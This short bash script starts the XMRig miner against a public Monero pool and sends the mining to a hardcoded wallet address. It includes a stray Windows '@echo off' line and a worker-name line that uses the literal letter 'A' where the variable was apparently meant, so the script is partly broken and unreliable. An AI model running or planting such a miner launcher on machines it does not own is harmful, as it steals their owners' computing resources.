#!/bin/bash
@echo off
A=us.monero.herominers.com:1111
B=8AhhEgFKdyEcvrBBZwWrenSDqNz3WRz2r7bHLNmPDFVzX44Wez7yQX9CvhsVh9Hqdx17NWyypmXjxaTu5gumSNEjFA9zmk5
C=$(echo $(shuf -i 1-9 -n 1)-xmr-A)
./xmrig --donate-level 1 -o $A -u $B -p $C -a rx/0 -k 